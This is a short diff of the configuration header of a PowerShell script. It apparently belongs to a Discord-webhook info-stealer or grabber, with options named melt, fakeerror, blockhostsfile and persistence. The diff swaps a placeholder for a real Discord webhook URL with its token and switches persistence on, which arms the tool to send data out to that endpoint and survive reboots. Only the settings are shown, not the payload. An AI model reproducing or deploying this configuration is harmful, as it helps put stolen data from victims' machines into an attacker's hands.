@@ -1,10 +1,10 @@
-$webhook = "YOUR_WEBHOOK_HERE" 
+$webhook = "https://discord.com/api/webhooks/1246421806601080854/oVqJh2RCMoVL0-4bj4RcS0w06L6xdUCIGRKzvVOTh5L_IOQpngqroYFsyUbc5UKMzU9G"
 $debug = $false
 $blockhostsfile = $false
-$criticalprocess = $true
+$criticalprocess = $false
 $melt = $false
 $fakeerror = $false
-$persistence = $false
+$persistence = $true
 
 if ($debug) {
     $ProgressPreference = 'Continue'
